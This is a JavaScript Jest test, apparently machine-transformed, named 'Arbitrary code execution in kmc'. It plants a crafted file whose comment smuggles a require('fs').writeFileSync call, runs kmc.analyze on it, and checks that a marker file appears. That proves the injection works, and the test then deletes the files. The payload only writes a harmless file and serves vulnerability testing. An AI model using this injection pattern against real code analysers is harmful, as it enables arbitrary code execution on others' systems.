const v25 = () => {
    const v14 = expect.assertions(2);
    v14;
    const fs = require('fs');
    let kmc = require('kmc/lib');
    const path = './kmc';
    const v15 = 'red(); require(\'fs\').writeFileSync(\'' + path;
    let payload = v15 + '\',``); //';
    data = {};
    file_exist = fs.existsSync(path);
    const v16 = expect(file_exist);
    const v17 = v16.toBe(false);
    v17;
    const v18 = fs.writeFileSync('./exploit.js', '//{requires:[require(\'fs\').writeFileSync(\'kmc\',\'\')]});');
    v18;
    try {
        const v19 = kmc.analyze('./exploit.js');
        v19;
    } catch (e) {
    }
    const v20 = fs.unlinkSync('./exploit.js');
    v20;
    file_exist = fs.existsSync(path);
    const v21 = expect(file_exist);
    const v22 = v21.toBe(true);
    v22;
    const v23 = function (err) {
    };
    const v24 = fs.unlink(path, v23);
    v24;
};
const v26 = test('Arbitrary code execution in kmc', v25);
v26;